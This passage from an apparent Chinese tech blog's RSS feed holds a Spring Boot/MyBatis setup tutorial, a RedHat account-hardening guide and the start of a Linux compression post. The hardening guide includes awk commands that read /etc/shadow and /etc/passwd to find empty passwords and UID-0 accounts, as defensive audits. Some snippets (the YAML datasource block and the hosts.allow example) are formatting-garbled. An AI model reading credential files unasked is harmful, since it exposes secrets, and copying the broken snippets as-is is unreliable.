MyBatis 是一款优秀的持久层框架, 它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。这里介绍 Spring Boot 整合 Mybatis 的步骤, 数据库选用 MYSQL。

</description>
      <category>java</category>
      <pubDate>Wed, 22 Aug 2018 16:01:15 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>提示</p>
<p>MyBatis 是一款优秀的持久层框架, 它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。这里介绍 Spring Boot 整合 Mybatis 的步骤, 数据库选用 MYSQL。</p>
</div>

<h2 id="修改-pom-xml" tabindex="-1"> 修改 pom.xml</h2>
<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.spring.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-spring-boot-starter<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.2<span><span><span>&lt;/</span>version</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>

<span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>mysql<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mysql-connector-java<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>scope</span><span>></span></span>runtime<span><span><span>&lt;/</span>scope</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>

<span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="修改-spring-boot-配置文件" tabindex="-1"> 修改 Spring Boot 配置文件</h2>
<p>这里使用 yml 格式的配置文件, 将 application.properties 改名为 application.yml, 下面配置请根据自己的需求而修改</p>
<div><pre><code>#
端口
server:
    port: 8080

# 配置数据源
spring:
    datasource:
    url: jdbc: mysql: //127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=utf8
    username: root
password: root
driver - class - name: com.mysql.jdbc.Driver

# 打印 SQL 语句信息
logging:
    level:
    com.mysql.api: debug

debug: false
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>Spring Boot 会自动加载 application.yml 相关配置, 数据源就会自动注入到 s qlSessionFactory 中, sqlSessionFactory 会自动注入到 Mapper 中。</p>
<h2 id="使用插件快速生成代码" tabindex="-1"> 使用插件快速生成代码</h2>
<h3 id="配置-pom-xml" tabindex="-1"> 配置 pom.xml</h3>
<p>添加 Mybatis-generator 插件</p>
<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>

<span><span><span>&lt;</span>build</span><span>></span></span>
    <span><span><span>&lt;</span>plugins</span><span>></span></span>
        <span><span><span>&lt;</span>plugin</span><span>></span></span>
            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
            <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
            <span><span><span>&lt;</span>configuration</span><span>></span></span>
                <span><span><span>&lt;</span>fork</span><span>></span></span>true<span><span><span>&lt;/</span>fork</span><span>></span></span>
            <span><span><span>&lt;/</span>configuration</span><span>></span></span>
        <span><span><span>&lt;/</span>plugin</span><span>></span></span>
        <span><span><span>&lt;</span>plugin</span><span>></span></span>
            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>
            <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
            <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>
            <span><span><span>&lt;</span>configuration</span><span>></span></span>
                <span><span><span>&lt;</span>configurationFile</span><span>></span></span>src/main/resources/generatorConfig.xml<span><span><span>&lt;/</span>configurationFile</span><span>></span></span>
                <span><span><span>&lt;</span>verbose</span><span>></span></span>true<span><span><span>&lt;/</span>verbose</span><span>></span></span>
                <span><span><span>&lt;</span>overwrite</span><span>></span></span>true<span><span><span>&lt;/</span>overwrite</span><span>></span></span>
            <span><span><span>&lt;/</span>configuration</span><span>></span></span>
            <span><span><span>&lt;</span>executions</span><span>></span></span>
                <span><span><span>&lt;</span>execution</span><span>></span></span>
                    <span><span><span>&lt;</span>id</span><span>></span></span>Generate MyBatis Artifacts<span><span><span>&lt;/</span>id</span><span>></span></span>
                    <span><span><span>&lt;</span>goals</span><span>></span></span>
                        <span><span><span>&lt;</span>goal</span><span>></span></span>generate<span><span><span>&lt;/</span>goal</span><span>></span></span>
                    <span><span><span>&lt;/</span>goals</span><span>></span></span>
                <span><span><span>&lt;/</span>execution</span><span>></span></span>
            <span><span><span>&lt;/</span>executions</span><span>></span></span>
            <span><span><span>&lt;</span>dependencies</span><span>></span></span>
                <span><span><span>&lt;</span>dependency</span><span>></span></span>
                    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>
                    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-core<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
                    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>
                <span><span><span>&lt;/</span>dependency</span><span>></span></span>
            <span><span><span>&lt;/</span>dependencies</span><span>></span></span>
        <span><span><span>&lt;/</span>plugin</span><span>></span></span>
    <span><span><span>&lt;/</span>plugins</span><span>></span></span>
<span><span><span>&lt;/</span>build</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="编写配置文件-generatorconfig-xml" tabindex="-1"> 编写配置文件 generatorConfig.xml</h3>
<p>在 IntelliJ IDEA 开发环境下, 此文件需要放在 resource 根目录下, mybatis generator 默认加载此目录的配置文件, 以下文件需要根据自己的情况进行配置</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span><span>&lt;!</span><span>DOCTYPE</span> <span>generatorConfiguration</span>
        <span>PUBLIC</span> <span>"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span>
        <span>"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"</span><span>></span></span>

<span><span><span>&lt;</span>generatorConfiguration</span><span>></span></span>
    <span>&lt;!--数据库驱动jar --></span>
    <span><span><span>&lt;</span>classPathEntry</span>
        <span>location</span><span><span>=</span><span>"</span>D:\.m2\repository\mysql\mysql-connector-java\5.1.33\mysql-connector-java-5.1.33.jar<span>"</span></span> <span>/></span></span>

    <span><span><span>&lt;</span>context</span> <span>id</span><span><span>=</span><span>"</span>Tables<span>"</span></span> <span>targetRuntime</span><span><span>=</span><span>"</span>MyBatis3<span>"</span></span><span>></span></span>
        <span>&lt;!--去除注释 --></span>
        <span><span><span>&lt;</span>commentGenerator</span><span>></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>suppressDate<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>true<span>"</span></span><span>/></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>suppressAllComments<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>true<span>"</span></span> <span>/></span></span>
        <span><span><span>&lt;/</span>commentGenerator</span><span>></span></span>

        <span>&lt;!--数据库连接 --></span>
        <span><span><span>&lt;</span>jdbcConnection</span> <span>driverClass</span><span><span>=</span><span>"</span>com.mysql.jdbc.Driver<span>"</span></span>
            <span>connectionURL</span><span><span>=</span><span>"</span>jdbc:mysql://129.1.18.18:3306/ssm_demo<span>"</span></span> <span>userId</span><span><span>=</span><span>"</span>root<span>"</span></span>
            <span>password</span><span><span>=</span><span>"</span>root<span>"</span></span><span>></span></span>
        <span><span><span>&lt;/</span>jdbcConnection</span><span>></span></span>
        <span>&lt;!--默认false Java type resolver will always use java.math.BigDecimal if
            the database column is of type DECIMAL or NUMERIC. --></span>
        <span><span><span>&lt;</span>javaTypeResolver</span><span>></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>forceBigDecimals<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>/></span></span>
        <span><span><span>&lt;/</span>javaTypeResolver</span><span>></span></span>

        <span>&lt;!--生成实体类 指定包名 以及生成的地址 （可以自定义地址,但是路径不存在不会自动创建 使用Maven生成在target目录下,会自动创建） --></span>
        <span><span><span>&lt;</span>javaModelGenerator</span> <span>targetPackage</span><span><span>=</span><span>"</span>com.myapp.api.entity<span>"</span></span>
                            <span>targetProject</span><span><span>=</span><span>"</span>src/main/java<span>"</span></span><span>></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>enableSubPackages<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>true<span>"</span></span> <span>/></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>trimStrings<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>true<span>"</span></span> <span>/></span></span>
        <span><span><span>&lt;/</span>javaModelGenerator</span><span>></span></span>
        <span>&lt;!--生成SQLMAP文件 --></span>
        <span><span><span>&lt;</span>sqlMapGenerator</span> <span>targetPackage</span><span><span>=</span><span>"</span>mapping<span>"</span></span>
                         <span>targetProject</span><span><span>=</span><span>"</span>src/main/resources<span>"</span></span><span>></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>enableSubPackages<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>/></span></span>
        <span><span><span>&lt;/</span>sqlMapGenerator</span><span>></span></span>
        <span>&lt;!-- 生成DAO的包名和位置--></span>
        <span>&lt;!-- XMLMAPPER生成xml映射文件, ANNOTATEDMAPPER 生成的 dao 采用注解来写sql --></span>
        <span><span><span>&lt;</span>javaClientGenerator</span> <span>type</span><span><span>=</span><span>"</span>ANNOTATEDMAPPER<span>"</span></span>
                             <span>targetPackage</span><span><span>=</span><span>"</span>com.myapp.api.mapper<span>"</span></span>
                             <span>targetProject</span><span><span>=</span><span>"</span>src/main/java<span>"</span></span><span>></span></span>
            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>"</span>enableSubPackages<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>/></span></span>
        <span><span><span>&lt;/</span>javaClientGenerator</span><span>></span></span>

        <span>&lt;!--对应数据库表 mysql可以加入主键自增 字段命名 忽略某字段等 --></span>
        <span><span><span>&lt;</span>table</span> <span>tableName</span><span><span>=</span><span>"</span><span>"</span></span> <span>domainObjectName</span><span><span>=</span><span>"</span><span>"</span></span>
            <span>enableCountByExample</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>enableUpdateByExample</span><span><span>=</span><span>"</span>false<span>"</span></span>
            <span>enableDeleteByExample</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>enableSelectByExample</span><span><span>=</span><span>"</span>false<span>"</span></span>
            <span>selectByExampleQueryId</span><span><span>=</span><span>"</span>false<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;/</span>context</span><span>></span></span>
<span><span><span>&lt;/</span>generatorConfiguration</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="在-intellij-idea-配置" tabindex="-1"> 在 IntelliJ IDEA 配置</h3>
<p>配置命令 <code>mybatis-generator:generate -e</code></p>
<p><img src="/assets/spring-boot-11.png" alt="Spring Boot"></p>
<p>配置好之后点击旁边的运行按钮</p>
<p><img src="/assets/spring-boot-12.png" alt="Spring Boot"></p>
<p>当然也可以在 plugins 中找到 mybatis-generator, 双击运行或右击运行都可</p>
<p><img src="/assets/spring-boot-13.png" alt="Spring Boot"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/spring-boot-11.png" type="image/png"/>
    </item>
    <item>
      <title>RedHat 系统安全加固（一）帐号安全</title>
      <link>https://vxhly.github.io/views/liunx/account-security.html</link>
      <guid>https://vxhly.github.io/views/liunx/account-security.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RedHat 系统安全加固（一）帐号安全</source>
      <description>前言
本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。 本篇主要介绍相关于帐号安全的加固策略, 加强系统的防御能力。

</description>
      <category>liunx</category>
      <pubDate>Fri, 14 Oct 2016 11:06:38 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。 本篇主要介绍相关于帐号安全的加固策略, 加强系统的防御能力。</p>
</div>

<h2 id="密码规则" tabindex="-1"> 密码规则</h2>
<h3 id="密码长度和有效期" tabindex="-1"> 密码长度和有效期</h3>
<p><strong>/etc/login.defs</strong> 文件是当创建用户时的一些规划, 比如创建用户时, 是否需要家目录, UID 和 GID 的范围; 用户的期限等等, 这个文件是可以通过 <code>root</code> 来定义的</p>
<p><code>Default Configuration:</code></p>
<div><pre><code>PASS_MAX_DAYS 99999 # 两次改变密码之间相距的最大天数, 密码有效最大天数
PASS_MIN_DAYS 0 # 两次改变密码之间相距的最小天数, 为零时代表任何时候都可以更改密码
PASS_MIN_LEN 5 # 密码最小长度
PASS_WARN_AGE 7 # 在密码过期之前警告的天数
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>以上只对之后新增的用户有效, 如果要修改已存在的用户密码规则, 需要使用 <code>chage</code> 命令</p>
</div>
<p>使用以下命令, 可以查看用户的密码规则, <code>Command Format:</code></p>
<div><pre><code>chage -l <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>For Examlpe:</code> <br></p>
<p><img src="/assets/redhat-reinforce-1.png" alt="RedHat 系统安全加固"></p>
<h2 id="chage-命令" tabindex="-1"> chage 命令</h2>
<p>设置最大最小使用天数, 以及警告天数, <code>For Examlpe:</code></p>
<div><pre><code>chage -M <span>90</span> -m <span>6</span> -W <span>30</span> <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>不要用该命令给 root 用户加上有效期, 如果密码过期, 再加上后文说的 <code>/etc/shadow</code> 文件加锁禁止修改, 会导致 root 提示修改密码, 无法成功修改密码, 从而无法登陆。</p>
</div>
<p><code>chage</code> 选项解释</p>
<ul>
<li><strong>-m</strong> =&gt; 密码可更改的最小天数。 为零时代表任何时候都可以更改密码。</li>
<li><strong>-M</strong> =&gt; 密码保持有效的最大天数。</li>
<li><strong>-w</strong> =&gt; 用户密码到期前, 提前收到警告信息的天数。</li>
<li><strong>-E</strong> =&gt; 帐号到期的日期。 过了这天, 此帐号将不可用。</li>
<li><strong>-d</strong> =&gt; 上一次更改的日期。</li>
<li><strong>-i</strong> =&gt; 停滞时期。 如果一个密码已过期这些天, 那么此帐号将不可用。</li>
<li><strong>-l</strong> =&gt; 例出当前的设置。 由非特权用户来确定他们的密码或帐号何时过期。</li>
</ul>
<p>如果要修改密码过期时间为 <code>“从不”</code> , <code>For Examlpe:</code></p>
<div><pre><code>chage -M <span>99999</span> <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="空密码检查" tabindex="-1"> 空密码检查</h2>
<p><strong>/etc/shadow</strong> 文件中的记录行与 <strong>/etc/passwd</strong> 中的一一对应, 是记录系统中用户的密码的, 此文件只有 <code>root</code> 用户可以对其进行修改</p>
<p>使用 <code>awk</code> 命令可以检查是否存在空密码, <code>For Examlpe:</code></p>
<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($2==""){print $1}'</span> /etc/shadow
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="没密码检查" tabindex="-1"> 没密码检查</h2>
<p>空密码跟没有密码是俩回事, 体现于 <strong>/etc/shadow</strong> 中的密码那一列, 空密码是显示空, 没有密码是显示 <code>！ ！</code> 使用 <code>awk</code> 命令可以检查是否存在空密码, <code>For Examlpe:</code></p>
<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($2=="！ ！ "){print $1}'</span> /etc/shadow
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="awk-命令" tabindex="-1"> awk 命令</h2>
<p>查询 UID 为 0 的用户, <code>For Examlpe:</code></p>
<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($3==0){print $1}'</span> /etc/passwd
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>UID 为 0 的任何用户都拥有系统的最高特权, 保证只有 root 用户的 UID 为 0</p>
</div>
<p><code>awk</code> 选项解释</p>
<ul>
<li><strong><code>-F fs</code></strong> =&gt; fs 指定输入分隔符, fs 可以是字符串或正则表达式, 如 <code>-F:</code></li>
<li><strong><code>-v var=value</code></strong> =&gt; 赋值一个用户定义变量, 将外部变量传递给 <code>awk</code></li>
<li><strong><code>-f scripfile</code></strong> =&gt; 从脚本文件中读取 awk 命令</li>
<li><strong><code>-m[fr] val</code></strong> =&gt; 对 val 值设置内在限制, <code>-mf</code> 选项限制分配给 val 的最大块数目; <code>-mr</code> 选项限制记录的最大数目。 这两个功能是 Bell 实验室版 <code>awk</code> 的扩展功能, 在标准 <code>awk</code> 中不适用。</li>
</ul>
<h2 id="密码复杂度" tabindex="-1"> 密码复杂度</h2>
<p>redhat 公司专门开发了 <code>cracklib</code> 这个安装包来判断密码的复杂度。</p>
<p>检查是否安装了 <code>cracklib</code> 模块</p>
<div><pre><code><span>rpm</span> -qa <span>|</span> <span>grep</span> cracklib
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-3.png" alt="RedHat 系统安全加固"></p>
<p>在 <code>/etc/pam.d/system-auth</code> 中修改</p>
<div><pre><code>password requisite pam_cracklib.so try_first_pass retry = 3 difok = 3 minlen = 8 dcredit = -1 ucredit = -1 lcredit = -1 ocredit = -1
password sufficient pam_unix.so md5 shadow nullok try_first_pass use_authtok remember = 5
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/redhat-reinforce-4.png" alt="RedHat 系统安全加固"></p>
<h3 id="参数说明" tabindex="-1"> 参数说明</h3>
<ul>
<li><strong><code>retry=N</code></strong> =&gt; 改变输入密码的次数, 默认值是 1, 一般设置为 3。 就是说, 如果用户输入的密码强度不够可以重复输入的次数。</li>
<li><strong><code>minlen=N</code></strong> =&gt; 密码最小长度（除了 <code>credit</code> 信用度的字符长度以外）</li>
<li><strong><code>dcredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个数字</li>
<li><strong><code>ucredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个大写字母</li>
<li><strong><code>lcredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个小写字母</li>
<li><strong><code>ocredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个特殊字符</li>
<li><strong><code>difok=M</code></strong> =&gt; 新密码与前一个旧密码之间至少有 M 个字符不相同</li>
</ul>
<div><p>注意</p>
<p><code>dcredit</code> 、 <code>ucredit</code> 、 <code>lcredit</code> 、 <code>ocredit</code> 为信用度字符, 如果 <code>N&lt;0</code> , 表示至少, 则新密码长度最小长度就等于 minlen.。 而当 <code>N&gt;0</code> 时, 表示至多, 比如 <code>ocredit=1</code> , 至多有一个特殊字符, 这样的话, 即使没有特殊字符也会允许设置新密码。 还有, 此时新密码长度会大于 minlen。 算法交复杂, 这里不赘述。 因此, 通常情况下推荐使用 <code>N&lt;0</code> 来做密码复杂度限制。 另外, 此密码规则对 root 用户无效, 只针对普通用户修改自身密码</p>
</div>
<h2 id="登录验证规则" tabindex="-1"> 登录验证规则</h2>
<h3 id="记录普通用户登录失败次数并锁定用户" tabindex="-1"> 记录普通用户登录失败次数并锁定用户</h3>
<p>在 ** <code>/etc/pam.d/system-auth**</code>中<code>&quot;#%PAM-1.0&quot;</code>下面一行加入,<code>For Example:</code></p>
<div><pre><code>auth required pam_tally2.so deny = 3 unlock_time = 300
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>一定要加在 <code>#%PAM-1.0</code> 下面一行</p>
</div>
<p>参数说明</p>
<ul>
<li><strong><code>deny[=n]</code></strong> =&gt; 用户连续错误登陆的最大次数, 超过则锁定</li>
<li><strong><code>unlock_time</code></strong> =&gt; 设定普通用户锁定后, 多少时间后解锁, 单位是秒</li>
<li><strong><code>even_deny_root</code></strong> =&gt; 也限制 root 用户</li>
<li><strong><code>root_unlock_time[=n]</code></strong> =&gt; 设定 root 用户锁定后, 多少时间后解锁, 单位是秒</li>
<li><strong><code>quiet</code></strong> =&gt; 不对已锁定的用户发出提示信息</li>
</ul>
<div><p>注意</p>
<p>以上参数根据实际需要取舍, 如果使用了 even_deny_root 参数限制 root 用户登录错误次数, 而没有配置 root_unlock_time 的话, 一旦 root 用户被锁, 解锁将很麻烦。</p>
</div>
<h3 id="查看用户登录失败次数" tabindex="-1"> 查看用户登录失败次数</h3>
<p>当登录错误次数达到最大限制后, 用户再次登录时, 会提示</p>
<div><pre><code>Your account is locked.Maximum amount of failed attempts was reached.
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-6.png" alt="RedHat 系统安全加固"></p>
<p>通过以下命令可以查看用户登录失败次数, <code>Command Format:</code></p>
<div><pre><code>pam_tally2 -u <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>For Example:</code> <br></p>
<p><img src="/assets/redhat-reinforce-7.png" alt="RedHat 系统安全加固"></p>
<h3 id="解锁已经锁定的用户" tabindex="-1"> 解锁已经锁定的用户</h3>
<ul>
<li>自动解锁</li>
</ul>
<p>-- 如果配置了 <code>unlock_time</code> 或 <code>root_unlock_time</code> (针对 <code>root</code> 用户)参数, 则等待超过这个时长后, 帐户会自动解锁</p>
<ul>
<li>手动解锁:</li>
</ul>
<p>-- 只能以 <code>root</code> 用户通过命令 <code>pam_tally2 -u [userName] -r</code> 可以手动解锁因登录错误次数达到最大限制后自动锁定的用户, 同时登录错误次数会被重置为 0</p>
<h2 id="登录超时" tabindex="-1"> 登录超时</h2>
<p>对于 bash 用户, 修改 <code>/etc/profile</code> 或 <code>/etc/bashrc</code> , 所有使用 bash 的用户都会继承, <code>For Example:</code> <br></p>
<p><img src="/assets/redhat-reinforce-8.png" alt="RedHat 系统安全加固"></p>
<p>对于 csh 用户, 修改 <code>/etc/csh.cshrc</code> , 所有使用 csh 的用户都会继承, <code>For Example:</code> <br></p>
<p><img src="/assets/redhat-reinforce-9.png" alt="RedHat 系统安全加固"></p>
<p>对于 bash 用户, 修改 <code>/etc/profile</code> 或 <code>/etc/bashrc</code> , 所有使用 bash 的用户都会继承, <code>For Example:</code> <br></p>
<p><img src="/assets/redhat-reinforce-8.png" alt="RedHat 系统安全加固"></p>
<p>对于 csh 用户, 修改 <code>/etc/csh.cshrc</code> , 所有使用 csh 的用户都会继承, <code>For Example:</code> <br></p>
<p><img src="/assets/redhat-reinforce-9.png" alt="RedHat 系统安全加固"></p>
<h2 id="ssh" tabindex="-1"> SSH</h2>
<h3 id="禁止-root-用户远程-ssh-登录" tabindex="-1"> 禁止 root 用户远程 ssh 登录</h3>
<div><p>提示</p>
<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>
</div>
<h3 id="ssh-的黑白名单-指定用户或组" tabindex="-1"> ssh 的黑白名单（指定用户或组）</h3>
<div><p>提示</p>
<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>
</div>
<h3 id="ssh-的黑白名单-指定-ip" tabindex="-1"> ssh 的黑白名单（指定 IP）</h3>
<div><p>提示</p>
<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>
</div>
<h2 id="telnet" tabindex="-1"> Telnet</h2>
<h3 id="禁止-root-用户远程-telnet-登录" tabindex="-1"> 禁止 root 用户远程 telnet 登录</h3>
<div><p>提示</p>
<p>系统安装 <code>telnet-server</code> 服务后, 默认就是禁止 root 用户直接远程 telnet 登录的。 确认只要存在 <code>/etc/securetty</code> 文件, 就可以限制 root 直接远程 telnet 登录。</p>
</div>
<h3 id="telnet-的黑白名单-指定用户或组" tabindex="-1"> telnet 的黑白名单（指定用户或组）</h3>
<p>系统不支持限制普通用户 telnet 远程登录</p>
<h3 id="telnet-的黑白名单-指定-ip" tabindex="-1"> telnet 的黑白名单（指定 IP）</h3>
<p>与 <code>SSH</code> 中的相差无几, 同样是在 <code>/etc/hosts.allow</code> 里添加白名单, 在 <code>/etc/hosts.deny</code> 里添加黑名单, <code>For Example:</code></p>
<div><pre><code>in .telnetd: 192.168 .1 .10 192.168 .1 .11# / etc / hosts.allow in .telnetd: ALL# / etc / hosts.deny
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="禁止普通用户登录-shell" tabindex="-1"> 禁止普通用户登录 shell</h2>
<p>使用 <code>usermod</code> 命令修改用户的登录 <code>shell</code> 就好, <code>Command Format:</code></p>
<div><pre><code><span>usermod</span> -s /sbin/nologin <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="避免普通用户-su-到-root-用户" tabindex="-1"> 避免普通用户 su 到 root 用户</h2>
<p>在 ** <code>/etc/pam.d/su**</code>中<code>&quot;#%PAM-1.0&quot;</code> 下面一行加入</p>
<div><pre><code>auth sufficient pam_rootok.so debug
auth required pam_wheel.so group = wheel
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/redhat-reinforce-5.png" alt="RedHat 系统安全加固"></p>
<p>当然只去除红框中的 <code>#</code> 也是 ok 的<br></p>
<p><img src="/assets/redhat-reinforce-10.png" alt="RedHat 系统安全加固"></p>
<p>这样以来只有 wheel 组的用户可以 su 作为 root</p>
<h2 id="指定可以-su-到-root-的用户" tabindex="-1"> 指定可以 su 到 root 的用户</h2>
<p>指定某个用户可以 su 到 root 用户, 需要将该用户加入到 wheel 组中</p>
<div><pre><code><span>usermod</span> -G wheel <span>[</span>username<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>如果禁止 root 用户直接登录, 也不存在 wheel 组的用户, 就无法进入 root 用户了</p>
</div>
<p><img src="/assets/redhat-reinforce-11.png" alt="RedHat 系统安全加固"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/redhat-reinforce-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 学习笔记（三）文件的压缩与解压缩</title>
      <link>https://vxhly.github.io/views/liunx/file-compression-and-decompression.html</link>
      <guid>https://vxhly.github.io/views/liunx/file-compression-and-decompression.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（三）文件的压缩与解压缩</source>
      <description>前言
本篇是 Liunx 的学习笔记系列第三篇, 这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率。

</description>
      <category>liunx</category>
      <pubDate>Sat, 10 Sep 2016 14:04:39 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的学习笔记系列第三篇, 这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率。</p>
</div>

<h2 id="gz-格式" tabindex="-1"> .gz 格式</h2>
